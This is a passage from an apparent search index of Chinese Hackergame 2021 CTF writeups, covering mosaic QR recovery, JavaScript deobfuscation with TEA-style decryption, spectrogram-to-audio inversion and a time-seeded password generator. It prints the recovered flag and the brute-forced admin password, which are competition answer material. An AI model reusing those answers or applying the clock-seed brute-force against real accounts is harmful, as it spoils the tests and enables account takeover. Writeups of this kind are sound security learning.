\u6211\u505a\u7684\u80af\u5b9a\u4e0d\u662f\u6b63\u89e3\uff0c\u5229\u7528\u4e8c\u7ef4\u7801\u7ea0\u9519\u80fd\u529b\u52c9\u5f3a\u62ff\u5230\u4e86 flag\uff0c\u6240\u4ee5\u5c31\u4e0d\u8be6\u7ec6\u5199 writeup \u4e86\uff0c\u4e3b\u8981\u8fd8\u662f\u8981\u770b\u5b98\u65b9 wp\uff08\u9003 \u5927\u6982\u6b65\u9aa4\u5c31\u662f\uff1a \u8bfb\u56fe\u7247 \u628a\u5df2\u77e5\u7684\u50cf\u7d20\u63d0\u53d6\u51fa\u6765 \u628a\u56db\u4e2a\u5c0f\u5b9a\u4f4d\u5757\u586b\u4e0a \u6328\u4e2a\u9a6c\u8d5b\u514b\u5757\u5bfb\u627e\u4f7f\u8fd8\u539f\u7684\u6570\u636e\u5e73\u5747\u6570\u4e0e\u539f\u9a6c\u8d5b\u514b\u503c\u5dee\u7684\u7edd\u5bf9\u503c\u5c0f\u4e8e1\u7684\u586b\u8865\u65b9\u6cd5 \u5982\u679c\u53ea\u6709\u4e00\u79cd\u5c31\u586b\u4e0a\uff0c\u5e76\u4e14\u6807\u6ce8\u5df2\u7ecf\u586b\u597d\uff0c\u4ee5\u540e\u4e0d\u518d\u641c\u5bfb \u5982\u679c\u6709\u591a\u79cd\u5c31\u5148\u653e\u4e0b\u4e0d\u586b \u91cd\u590d4\u7684\u8fc7\u7a0b\uff0c\u8fd9\u662f\u8fd8\u4f1a\u6709\u552f\u4e00\u786e\u5b9a\u7684\u586b\u8865\u65b9\u6848\u3002\u91cd\u590d4\u6b21\u5927\u6982\u5c31\u4e0d\u5269\u552f\u4e00\u89e3\u4e86 \u8fd9\u65f6\u91cd\u590d4\uff0c\u627e\u51fa\u4ec5\u67092\u4e2d\u586b\u8865\u65b9\u6cd5\u7684\uff0c\u9009\u8bef\u5dee\u6700\u5c0f\u7684\u586b\u4e0a \u7136\u540e\u518d\u91cd\u590d4 \u7136\u540e\u91cd\u590d6 \u7136\u540e\u91cd\u590d4 \u8fd9\u65f6\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u8fd8\u539f\u5f97\u5dee\u4e0d\u591a\u4e86\uff0c\u5269\u4e0b\u7684\u4e0d\u7ba1\u76f4\u63a5\u626b\u7801\u4e5f\u53ef\u4ee5\u626b\u51fa flag \u4e86 \u770b\uff0c\u505a\u6cd5\u5f88\u70c2\u5bf9\u5427","title":"\u9a6c\u8d5b\u514b"},{"location":"writeups/hackergame2021/#minecraft","text":"kk \u540c\u5b66\u5f88\u559c\u6b22\u73a9 Minecraft\uff0c\u4ed6\u6700\u8fd1\u6536\u5230\u4e86\u4e00\u5f20 MC \u5730\u56fe\uff0c\u5730\u56fe\u91cc\u9762\u6709\u4e09\u76cf\u706f\uff0c\u8fd8\u6709\u5f88\u591a\u5947\u5947\u602a\u602a\u7684\u538b\u529b\u677f\u3002 \u4f46\u4ed6\u53d1\u73b0\u8fd9\u4e9b\u706f\u597d\u50cf\u4e0d\u592a\u7b26\u5408 MC \u7535\u78c1\u5b66\uff08Red stone\uff09\uff0c\u4f60\u80fd\u5e2e\u4ed6\u628a\u706f\u5168\u90e8\u70b9\u4eae\u5417\uff1f \u6ce8\uff1a\u672c\u9898\u89e3\u6cd5\u4e0e\u539f\u7248 Minecraft \u6e38\u620f\u65e0\u5173\u3002 \u8865\u5145\u8bf4\u660e\uff1aflag \u82b1\u62ec\u53f7\u5185\u4e3a\u8ba9\u4e09\u76cf\u706f\u5168\u90e8\u70b9\u4eae\u7684\u6700\u77ed\u7684\u8f93\u5165\u5e8f\u5217\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8e29\u8e0f\u538b\u529b\u677f\u8f93\u5165\u7684\u6700\u77ed\u7684\u5e8f\u5217\u4e3a abc\uff0c\u5219\u7b54\u6848\u4e3a flag{abc}\u3002 \u8fd8\u633a\u597d\u73a9\u7684\u9898\uff0c\u5728\u7f51\u9875\u4e2d\u6a21\u62df\u4e86\u4e00\u4e2amc\u51fa\u6765 \u770b\u6e90\u7801\u770b\u5230\u4e86\u5f15\u5165\u4e86 flag.js \u6587\u4ef6\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u662f\u8981\u901a\u8fc7\u5b83\u6765\u5f97\u5230\u7b54\u6848\uff1a < script src = \"jsm/miscs/flag.js\" ></ script > \u4e5f\u53ef\u4ee5\u770b\u5230\uff0c\u6700\u7ec8\u5224\u65ad\u662f\u5426\u6b63\u786e\u662f\u901a\u8fc7\u8c03\u7528 gyflagh(input) \u662f\u5426\u4e3a true \u6765\u5224\u65ad\uff0c\u800c gyflagh \u4e5f\u5728 flag.js \u4e2d\uff0c\u6240\u4ee5\u8fd8\u662f\u8981\u770b flag.js \u4f46\u662f flag.js \u662f\u7ecf\u8fc7\u7b80\u5355\u6df7\u6dc6\u8fc7\u7684\uff0c\u8fd8\u662f\u8981\u8d39\u70b9\u65f6\u95f4\u8bfb\u4e00\u4e0b \u5176\u4e2d\u6709\u56db\u4e2a\u8f6c\u6362 Str4 Base16 \u548c Long \u7684\u51fd\u6570\u53ef\u4ee5\u7565\u6389\u4e0d\u7ba1 \u6ce8\u610f\u5230\u4e86 _0x381b() \u8fd9\u4e2a\u51fd\u6570\u91cc\u6709\u4e00\u4e2a\u5217\u8868\uff0c\u800c\u4e14\u6bd4\u8f83\u7b80\u5355\uff0c\u5176\u5b9e\u5b83\u8fd4\u56de\u7684\u5c31\u662f\u8fd9\u4e2a\u5217\u8868 ['encrypt', '33MGcQht', '6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c', '14021KbbewD', 'charCodeAt', '808heYYJt', '5DlyrGX', '552oZzIQH', 'fromCharCode', '356IjESGA', '784713mdLTBv', '2529060PvKScd', '805548mjjthm', '844848vFCypf', '4bIkkcJ', '1356853149054377', 'length', 'slice', '1720848ZSQDkr'] \u4f46\u662f\u5728 Console \u91cc\u9762\u8c03\u7528 _0x381b \u5f97\u5230\u7684\u5374\u662f\u4ee5 'slice' \u5f00\u5934\u3001'length' \u7ed3\u5c3e\u7684\u5217\u8868\uff0c\u5c06\u8fd9\u4e2a\u5217\u8868\u8bb0\u4e3a lst \u65b9\u4fbf\u8868\u8ff0 \u800c\u4e14\u6e90\u7801\u4e2d\u53ea\u6709\u6700\u5f00\u5934\u7684\u8c03\u7528\u533f\u540d\u51fd\u6570\u91cc\u9762\u6709 ['push'] \u548c ['shift'] \uff0c\u6240\u4ee5\u63a8\u6d4b\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u5c31\u662f\u5c06\u8fd9\u4e2a\u5217\u8868\u5faa\u73af\u53f3\u79fb\u4e24\u4e2a\u4f4d\u7f6e \u90a3\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u4e5f\u4e0d\u7528\u770b\u4e86 \u518d\u6765\u770b _0x2c9e() \u8fd9\u4e2a\u51fd\u6570\uff1a function _0x2c9e ( _0x49e6ff , _0x310d40 ) { const _0x381b4c = _0x381b (); return _0x2c9e = function ( _0x2c9ec6 , _0x2ec3bd ) { _0x2c9ec6 = _0x2c9ec6 - 0x1a6 ; let _0x4769df = _0x381b4c [ _0x2c9ec6 ]; return _0x4769df ; } , _0x2c9e ( _0x49e6ff , _0x310d40 ); } \u5176\u4e2d _0x381b4c \u662f\u521a\u521a\u8bf4\u7684\u90a3\u4e2a\u5217\u8868 lst\u3002\u7136\u540e return \u91cc\u9762\u91cd\u65b0\u5b9a\u4e49\u4e86 _0x2c9e \uff0c\u4f46\u662f\u65b0\u7684\u5b9a\u4e49\u91cc\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5e76\u6ca1\u6709\u7528\uff0c\u7136\u540e\u8c03\u7528\u8fd4\u56de\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\uff1a function _0x2c9e ( _0x2c9ec6 , ...) { _0x2c9ec6 = _0x2c9ec6 - 0x1a6 ; return lst [ _0x2c9ec6 ]; } 0x1a6 \u662f 422\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u4e5f\u5c31\u76f8\u5f53\u4e8e function(x) { return lst[x - 422]; } \u540c\u65f6\u6839\u636e\u7b2c\u4e00\u884c\uff0c\u7a0b\u5e8f\u4e2d\u6240\u6709 _0x22517d \u4e5f\u662f\u8fd9\u4e2a\u51fd\u6570 \u7136\u540e\u770b\u5224\u65ad\u7b54\u6848\u7684 gyflagh \u51fd\u6570 function gyflagh ( _0x111955 ) { const _0x50051f = _0x22517d ; let _0x3b790d = _0x111955 [ _0x50051f ( 0x1a8 )]( _0x50051f ( 0x1b7 )); if ( _0x3b790d === _0x50051f ( 0x1aa )) return !! []; return ! []; } \u6ca1\u5565\u7279\u522b\u7684\uff0c\u7ed3\u5408 lst \u53ef\u4ee5\u5f97\u5230\uff1a function gyflagh ( ans ) { if ( ans [ \"encrypt\" ]( \"1356853149054377\" ) === \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\" ) { return true ; } return false ; } \u7136\u540e\u5c31\u53ef\u4ee5\u7ed3\u5408 lst \u4e2d\u7684\u503c\u548c\u7d22\u5f15\uff0c\u7ffb\u8bd1\u51fa\u6700\u91cd\u8981\u7684\u51fd\u6570 \u518d\u8fdb\u884c\u4e00\u4e9b\u8fd0\u7b97\uff0c\u7528\u6ce8\u91ca\u6807\u6ce8\u4e00\u4e0b\u5df2\u77e5\u7684\u503c\u5c31\u53ef\u4ee5\u5f97\u5230\uff1a String [ \"prototype\" ][ \"encrypt\" ] = function ( key ) { // key = \"1356853149054377\" const left = new Array ( 2 ); const right = new Array ( 4 ); let res = \"\" ; ans = escape ( this ); // this := ans right = [ 909456177 , 825439544 , 892352820 , 926364468 ] for ( var i = 0 ; i < ans [ \"length\" ]; i = i + 8 ) { left [ 0 ] = Str4ToLong ( ans [ \"slice\" ]( i , i + 4 )); left [ 1 ] = Str4ToLong ( ans [ \"slice\" ]( i + 4 , i + 8 )); code ( left , right ); res = res + ( LongToBase16 ( left [ 0 ]) + LongToBase16 ( left [ 1 ])); } return res ; // 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c }; \u518d\u6765\u770b code \u51fd\u6570\uff0c\u6839\u636e << 4\u3001 ^\u3001 >>> 5 \u53ef\u4ee5\u5927\u80c6\u63a8\u6d4b\u7c7b\u4f3c TEA\uff0c\u7136\u540e\u89e3\u7801\u5c31\u76f4\u63a5\u7ffb\u8fc7\u6765\u5c31\u597d\u4e86\uff1a function dec ( left , right ) { for ( var i = 2654435769 * 32 ; i != 0 ;) { left [ 1 ] -= (( left [ 0 ] << 4 ^ left [ 0 ] >>> 5 ) + left [ 0 ] ^ i + right [ i >>> 11 & 3 ]); i -= 2654435769 ; left [ 0 ] -= (( left [ 1 ] << 4 ^ left [ 1 ] >>> 5 ) + left [ 1 ] ^ i + right [ i & 3 ]); } console . log ( left ); } \u6700\u540e\u628a\u8981\u5f97\u5230\u7684 res \u5206\u5757\uff0c\u6bcf 8 \u4e2a\u4e00\u7ec4\uff1a 6fbde674 819a59bf a1209256 5b4ca2a7 a11dc670 c678681d af4afb67 04b82f0c \u7136\u540e\u4ece\u540e\u5f80\u524d\uff0c\u6bcf\u4e24\u4e2a\u6267\u884c Base16ToLong\uff0c\u7136\u540e\u4f5c\u4e3a left \u4f20\u7ed9 dec \u51fd\u6570\u89e3\u7801\uff0c\u7136\u540e\u518d LongToStr4 \u5f97\u5230\u56db\u4e2a\u5b57\u7b26: \u62fc\u8d77\u6765\u5c31\u662f flag \u4e86\uff1a flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i}","title":"minecRaft"},{"location":"writeups/hackergame2021/#_13","text":"\u5c0f T \u6700\u8fd1\u53c8\u5199\u4e86\u4e00\u4e2a web \u5e94\u7528\u3002 \u4ed6\u53d1\u73b0\u5f88\u591a\u7528\u6237\u90fd\u559c\u6b22\u8bbe\u7f6e\u5f31\u5bc6\u7801\uff0c\u4e8e\u662f\u51b3\u5b9a\u8ba9\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u90fd\u5fc5\u987b\u662f 16 \u4f4d\u957f\uff0c\u5e76\u4e14\u5404\u79cd\u7b26\u53f7\u90fd\u8981\u6709\u3002\u4e3a\u4e86\u8ba9\u5927\u5bb6\u53ef\u4ee5\u65b9\u4fbf\u751f\u6210\u8fd9\u6837\u7684\u5bc6\u7801\uff0c\u4ed6\u8fd8\u5199\u4e86\u4e00\u4e2a\u5bc6\u7801\u751f\u6210\u5668\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u751f\u6210\u7b26\u5408\u89c4\u5219\u7684\u5bc6\u7801\u3002 \u4f46\u8fd9\u6837\u679c\u771f\u5b89\u5168\u5417\uff1f \uff08\u611f\u89c9\u8fd9\u6b21 Hackergame \u9898\u7684 tag \u90fd\u5f88\u8be1\u5f02\u3002\u8fd9\u9898\u660e\u660e\u662f misc(general) \u4e3a\u4ec0\u4e48\u6253\u4e86 binary \u7684 tag\uff09 \u770b\u5230 binary tag \u76f4\u63a5\u5148\u5f80 IDA \u91cc\u9762\u4e22\uff0c\u7136\u540e\u62a5\u9519\u4e86\uff0c\u5927\u6982\u662f\u56e0\u4e3a\u90e8\u5206 winapi \u5bfc\u5165\u4e0d\u8fdb\u53bb\u7684\u95ee\u9898\uff08\uff1f\uff09 \u7136\u540e\u5c31\u4e0d\u4f1a\u4e86\u2026\u2026 \u5bf9\u7740 IDA \u5e72\u77aa\u773c \u770b\u9898\uff0c\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u7f51\u7ad9\uff0c\u7528\u6765\u53d1\u5e03\u5c55\u677f\uff0c\u770b\u8d77\u6765\u53ea\u6709 admin \u7528\u6237\uff0c\u800c\u4e14\u6ca1\u6709\u6ce8\u518c\u7cfb\u7edf\uff0c\u6240\u4ee5\u5e94\u8be5\u5c31\u662f\u8981\u641e\u5230 admin \u7684\u5bc6\u7801\u4e86 \u518d\u7ec6\u770b\u7f51\u7ad9\uff0c\u7279\u610f\u63d0\u5230 \u201c\u7f51\u9875\u663e\u793a \u65f6\u95f4 \u201d\uff0c\u800c\u4e14\u5c55\u677f\u540e\u9762\u90fd\u6709\u53d1\u5e03\u65f6\u95f4\uff0c\u70b9\u8fdb admin \u7684\u7528\u6237\u9875\u9762\u53d1\u73b0\u4e5f\u6709\u6ce8\u518c\u65f6\u95f4\uff0c\u7740\u5b9e\u6709\u4e9b\u8bb8\u8be1\u5f02\uff08 \u6240\u4ee5\u65f6\u95f4\u5e94\u8be5\u662f\u4e00\u4e2a\u63d0\u793a \u800c\u5199\u4ee3\u7801\u7684\u65f6\u5019\u8bbe\u7f6e\u968f\u673a\u6570\u79cd\u5b50\u53c8\u5e38\u4ee5\u5f53\u524d\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\uff0c\u6240\u4ee5\u751f\u6210\u7684\u5bc6\u7801\u53ef\u80fd\u662f\u548c\u65f6\u95f4\u6709\u5173\u7cfb\u7684 \u901a\u8fc7\u8c03\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u540c\u4e00\u79d2\u70b9\u4e0b\u751f\u6210\uff0c\u4ea7\u751f\u7684\u5bc6\u7801\u662f\u4e00\u6837\u7684 \u6240\u4ee5\u53ea\u9700\u8981\u628a\u7cfb\u7edf\u65f6\u95f4\u8c03\u5230 admin \u7684\u6ce8\u518c\u65f6\u95f4\u5de6\u53f3\uff0c\u7136\u540e\u6bcf\u79d2\u751f\u6210\u5bc6\u7801\uff0c\u518d\u6328\u4e2a\u8f93\u8fdb\u53bb\u7206\u7834\u5373\u53ef \u6700\u540e\u5f97\u5230 2021-09-22 23:10:53 \u65f6\u751f\u6210\u7684\u5bc6\u7801 $Z=CBDL7TjHu~mEX \u5c31\u662f admin \u7684\u5bc6\u7801 \u7136\u540e\u767b\u5f55\u5373\u53ef\u5728\u201c\u6211\u7684\u201d\u91cc\u770b\u5230\u4e00\u6761\u79c1\u5bc6\u5c55\u677f\uff0c\u5185\u5bb9\u662f flag","title":"\u5bc6\u7801\u751f\u6210\u5668"},{"location":"writeups/hackergame2021/#pq","text":"\u5b66\u4f1a\u5085\u91cc\u53f6\u7684\u4e00\u77ac\u95f4\uff0c\u6094\u6068\u7684\u6cea\u6c34\u6d41\u4e86\u4e0b\u6765\u3002 \u5f53\u6211\u770b\u5230\u97f3\u9891\u64ad\u653e\u5668\u4e2d\u8df3\u52a8\u7684\u9891\u8c31\u52a8\u753b\uff0c\u6708\u660e\u661f\u7a00\u7684\u591c\u665a\uff0c\u6df1\u9083\u7684\u94f6\u6cb3\uff0c\u53ea\u6709\u5929\u4f7f\u5728\u6d45\u541f\u4f4e\u5531\uff0c\u590d\u6742\u7684\u60c5\u611f\u4e8e\u6211\u773c\u4e2d\u6ea2\u51fa\uff0c\u50cf\u662f\u6c89\u5165\u4e86\u96fe\u91cc\u6726\u80e7\u7684\u6d77\u4e00\u6837\u7684\u6e29\u67d4\u3002 \u8fd9\u4e00\u523b\u6211\u624d\u77e5\u9053\uff0c\u8033\u673a\u97f3\u54cd\u4e5f\u5c31\u56fe\u4e00\u4e50\uff0c\u771f\u542c\u97f3\u4e50\u8fd8\u5f97\u9760\u773c\u775b\u3002 \uff08\u6ce8\u610f\uff1aflag \u82b1\u62ec\u53f7\u5185\u662f\u4e00\u4e2a 12 \u4f4d\u6574\u6570\uff0c\u7531 0-9 \u6570\u4f4d\u7ec4\u6210\uff0c\u6ca1\u6709\u5176\u5b83\u5b57\u7b26\u3002\uff09 \u867d\u7136\u8fd9\u9898\u662f\u5728\u5012\u6570\u7b2c\u4e09\u9898\uff0c\u8fd8\u503c 400pt\uff0c \u4f46\u4f60\u4e00\u8bf4\u5085\u91cc\u53f6\u6211\u53ef\u5c31\u4e0d\u56f0\u4e86\u55f7 \u4e0b\u8f7d\u9898\u76ee\u5305\uff0c\u6709\u4e00\u4e2a\u751f\u6210 gif \u7684 py \u4ee3\u7801\u548c\u90a3\u4e2a gif \u6587\u4ef6 \u6b63\u597d\u524d\u9762\u7684\u7535\u6ce2\u4e5f\u6709\u4e00\u6bb5\u97f3\u9891\uff0c\u53ef\u4ee5\u7528\u90a3\u4e2a\u5e26\u5165\u5230 generate_sound_visualization.py \u4e2d\u751f\u6210\u4e00\u4e2a gif\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u6765\u6d4b\u8bd5 \u518d\u4ed4\u7ec6\u770b\u4e00\u770b generate_sound_visualization.py \u8fd9\u4e2a\u6587\u4ef6 \u4e3b\u8981\u4f7f\u7528\u4e86 librosa \uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u7ffb \u6587\u6863 \u6765\u770b\u61c2\u8fd9\u4e2a\u7a0b\u5e8f\uff1a y , sample_rate = librosa . load ( \"flag.mp3\" ) # \u4ecemp3\u4e2d\u8bfb\u53d6\u6570\u636e\u548c\u91c7\u6837\u7387 spectrogram = numpy . around ( # \u56db\u820d\u4e94\u5165\uff0c\u4f46\u4f1a\u9020\u6210\u9006\u5411\u7684\u65f6\u5019\u6709\u5c11\u8bb8\u8bef\u5dee\u5bfc\u81f4\u6742\u97f3 librosa . power_to_db ( # \u628a\u4ee5\u529f\u7387\u4e3a\u5355\u4f4d\u7684\u9891\u8c31\u56fe\u8f6c\u6362\u4e3a\u4ee5\u5206\u8d1d\u4e3a\u5355\u4f4d librosa . feature . melspectrogram ( # \u901a\u8fc7\u97f3\u9891\u6570\u636e\u548c\u91c7\u6837\u7387\u8ba1\u7b97\u6885\u5c14\u9891\u8c31 y , sample_rate , n_mels = num_freqs , n_fft = fft_window_size , hop_length = frame_step_size , window = window_function_type ) ) / quantize # \u9664\u4ee52 ) * quantize # \u4e58\u4ee52 \u7136\u540e\u53c8\u901a\u8fc7\u4e00\u4e9b numpy \u7684\u9a9a\u64cd\u4f5c\u6765\u751f\u6210\u6bcf\u4e00\u5e27\u7684\u6570\u636e\uff0c\u7136\u540e\u901a\u8fc7 array2gif \u5305\u7684 write_gif \u51fd\u6570\u6765\u751f\u6210 gif \u6240\u4ee5\u4e3b\u8981\u601d\u8def\u5c31\u662f\u628a\u6574\u4e2a\u7a0b\u5e8f \u5b8c\u6574\u5730\u9006\u8fc7\u6765 \u7531\u4e8e\u5fc5\u5e94\u6ca1\u6709\u67e5\u5230 gif2array \u7684\u5305\uff0c\u6240\u4ee5\u8bfb\u53d6 gif \u5c31\u7528\u4e86\u7ecf\u5178 PIL.Image \uff1a from PIL import Image file = Image . open ( \"flag.gif\" ) try : while True : gif_data . append ( np . array ( file )) file . seek ( file . tell () + 1 ) except : print ( \"[+] Read gif file\" ) \u7136\u540e\u662f\u89e3\u51b3\u90a3\u4e00\u5927\u6bb5 numpy \u9a9a\u64cd\u4f5c\u7684\u9006\u9a9a\u64cd\u4f5c\uff08 \u4f46\u662f\u6570\u7406\u57fa\u7840\u8fd9\u4e48\u5dee\u7684\u6211\u5f53\u7136\u662f\u4e0d\u60f3\u4ed4\u7ec6\u7814\u7a76\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u7528\u7535\u6ce2\u90a3\u9898\u7684 radio.mp3 \u5e26\u5165\uff0c\u770b\u4e00\u770b\u8981\u5f97\u5230\u7684 spectrogram \u662f\u4ec0\u4e48\u6837\u5b50 \u8f93\u51fa\u5f97\u5230\u7684 spectrogram \u662f\uff1a [[ - 58. - 48. - 30. ... - 58. - 58. - 58. ] [ - 58. - 44. - 26. ... - 58. - 58. - 58. ] [ - 58. - 40. - 16. ... - 58. - 58. - 58. ] ... [ - 58. - 42. - 30. ... - 58. - 58. - 58. ] [ - 58. - 44. - 32. ... - 58. - 58. - 58. ] [ - 58. - 46. - 34. ... - 58. - 58. - 58. ]] \u800c\u8f6c\u7f6e\u8fc7\u6765\u662f\uff1a [[ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 48. - 44. - 40. ... - 42. - 44. - 46. ] [ - 30. - 26. - 16. ... - 30. - 32. - 34. ] ... [ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 58. - 58. - 58. ... - 58. - 58. - 58. ]] \u51cf\u53bb min_db=-60 \u7b2c\u4e00\u884c\u6b63\u597d\u662f 2\uff0c\u7b2c\u4e8c\u884c\u662f [12. 16. 20. ... 18. 16. 14.] \u518d\u5bf9\u5e94\u5230\u751f\u6210\u7684 gif \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u770b\u51fa gif \u7684\u7b2c\u4e00\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u90fd\u662f 2 \u800c\u7b2c\u4e8c\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u4e5f\u6070\u597d\u662f\u521a\u5f97\u51fa\u7684\u90a3\u7ec4\u6570 \u6240\u4ee5\u8981\u5f97\u5230\u7684 spectrogram \u5c31\u662f gif \u6bcf\u4e00\u5e27\u6240\u6709\u77e9\u5f62\u7684\u9ad8\u5ea6\u6784\u6210\u7684\u77e9\u9635\u7684\u8f6c\u7f6e \u518d\u7ed3\u5408\u6e90\u7801\uff1a numpy . array ([ [ red_pixel if freq % 2 and round ( frame [ freq // 2 ]) > threshold else white_pixel for threshold in list ( range ( min_db , max_db + 1 , quantize ))[:: - 1 ] ] for freq in range ( num_freqs * 2 + 1 ) ]) \u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e2a\u77e9\u5f62\u52a0\u4e0a\u5de6\u8fb9\u7684\u7a7a\u683c\u6b63\u597d\u662f 4 \u4e2a\u50cf\u7d20\uff0c\u6240\u4ee5\u6bcf\u56db\u5217\u8bfb\u53d6\u6700\u540e\u4e00\u5217\u5373\u53ef\uff1a spectrogramT = [] for data in gif_data : res = [] for ind , line in enumerate ( data . transpose ()): # \u5c06\u6bcf\u4e00\u5e27\u8f6c\u7f6e\uff0c\u65b9\u4fbf\u8ba1\u7b97 num = sum ( line ) # \u8ba1\u7b97\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\uff08\u8f6c\u7f6e\u540e\u662f\u5bbd\u5ea6\uff09 if ind % 4 == 3 : res . append ( num + min_db ) # \u5f97\u5230\u7684\u6570\u8981\u52a0\u4e0a-60\u624d\u7b26\u5408\u89c4\u77e9 spectrogramT . append ( res ) spectrogram = np . array ( spectrogramT ) . transpose () # \u5f97\u5230\u7684\u7ed3\u679c\u8f6c\u7f6e\u4e00\u4e0b \u8fd9\u6837\u5c31\u5f97\u5230\u4e86\u6885\u5c14\u9891\u8c31\u56fe\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u5bf9 librosa \u7684\u90e8\u5206\u8fdb\u884c\u9006\u8fc7\u7a0b\u4e86 \u7ffb librosa \u7684\u6587\u6863\uff0c\u6709 power_to_db \u5f53\u7136\u4e5f\u5c31\u6709 db_to_power \u800c\u4e14\u7c7b\u4f3c\u4e8e melspectrogram \u51fd\u6570\u5728 librosa.feature \u4e2d\uff0c\u53ef\u4ee5\u4e13\u95e8\u770b feature \u90e8\u5206\u7684\u6587\u6863 \u7ffb\u5230\u4e86 inverse \u90e8\u5206\uff0c\u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a\u51fd\u6570 librosa.feature.inverse.mel_to_audio \u53ef\u4ee5\u76f4\u63a5\u628a\u6885\u5c14\u9891\u8c31\u56fe\u4e13\u4e3a\u97f3\u9891\u6570\u636e\uff0c\u6240\u4ee5\u5c31\u7528\u5b83\u4e86\uff1a y = librosa . feature . inverse . mel_to_audio ( librosa . db_to_power ( spectrogram ), # \u4e58\u4e8c\u9664\u4e8c\u6ca1\u4ec0\u4e48\u5927\u7528\uff0c\u800c\u4e14\u5f71\u54cd\u6548\u679c\uff0c\u5c31\u5220\u4e86 sample_rate , n_iter = num_freqs , # \u91c7\u6837\u7387\u9898\u76ee\u63d0\u4f9b\u4e86\uff0c\u662f 22050Hz n_fft = fft_window_size , hop_length = frame_step_size , window = window_function_type , ) \u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u8fd8\u539f\uff0c\u6700\u540e\u662f\u8f93\u51fa\uff0c\u4f46\u662f\u5e76\u6ca1\u5728 librosa \u4e2d\u627e\u5230\u97f3\u9891\u8f93\u51fa\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u7528\u4e86\u7ecf\u5178 soundfile \uff1a import soundfile as sf sf . write ( \"flag.wav\" , y , sample_rate ) \u7136\u540e\u6253\u5f00\u542c\u5c31\u884c\u4e86\uff0c\u9898\u76ee\u8bf4\u4e86\u662f\u4e2a 12 \u4f4d\u6570\uff0c\u6240\u4ee5\u5269\u4e0b\u7684\u5c31\u662f\u82f1\u8bed\u542c\u529b\u4e86\uff0c\u7ffb\u8bd1\u8fc7\u6765\u7684\u6570\u5b57\u5c31\u662f flag \u4e86","title":"p\ud83d\ude2dq"},{"location":"writeups/hackergame2021/#reference","text":"Hackergame \u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 - \u77e5\u4e4e LUG@USTC \u5b98\u7f51 Wayback Machine archive.org SIGBOVIK 2021 \u767e\u5ea6\u5168\u666f\u5730\u56fe \u4f2a\u9020http\u8bf7\u6c42ip\u5730\u5740 - \u535a\u5ba2\u56ed GraphQL\u5b98\u7f51 \u3001 GraphiQL \u3001 GraphQL Voyager \u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e librosa\u6587\u6863 PySoundFile\u6587\u6863 Wilson's theorem - wikipedia BUU-RSA [RoarCTF2019]babyRSA - CSDN Euler's totient function - wikipedia LUKS2 doc pdf 10 Linux cryptsetup Examples for LUKS Key Management pyinstxtractor uncompyle6","title":"Reference"},{"location":"writeups/hackergame2022/","text":"Hackergame 2022 Writeup \u00b6 Abstract \u7b2c\u4e8c\u6b21\u6765\u6253 Hackergame\u3002\u8fd9\u91cc\u662f\u6211\u505a\u51fa\u7684\u9898\u7684 writeup\uff0c\u535a\u5ba2\u7248\u5728\uff1a https://blog.tonycrane.cc/p/630bfdd5.html \u5b98\u65b9 writeup \u7b7e\u5230 \u00b6 \u4f17\u6240\u5468\u77e5\uff0c\u7b7e\u5230\u9898\u662f\u4e00\u9053\u624b\u901f\u9898\u3002 \u4e3a\u4e86\u5145\u5206\u53d1\u6325\u51fa\u8bf8\u4f4d\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u800c\u624b\u901f\u4f18\u5f02\u4e8e\u5e38\u4eba\u7684\u9009\u624b\u4eec\u7684\u7279\u957f\uff0c\u6211\u4eec\u7cbe\u5fc3\u8bbe\u8ba1\u4e86\u4eca\u5e74\u7684\u7b7e\u5230\u9898\u3002\u8fdb\u4e00\u6b65\u5730\uff0c\u4e3a\u4e86\u66f4\u7ec6\u81f4\u5730\u533a\u5206\u4e0d\u540c\u624b\u901f\u7684\u9009\u624b\uff0c\u6211\u4eec\u8fd8\u901a\u8fc7\u8be6\u5c3d\u7684\u8c03\u7814\u53ca\u7edf\u8ba1\u5206\u6790\uff0c\u5c06\u7b7e\u4e0b\u5b57\u7b26\u7684\u65f6\u95f4\u9650\u5236\u5206\u4e3a\u4e86\u591a\u4e2a\u7b49\u7ea7\u3002\u53ea\u6709\u6700\u9876\u5c16\u7684\u624b\u901f\u9009\u624b\uff0c\u624d\u80fd\u5728 CPU 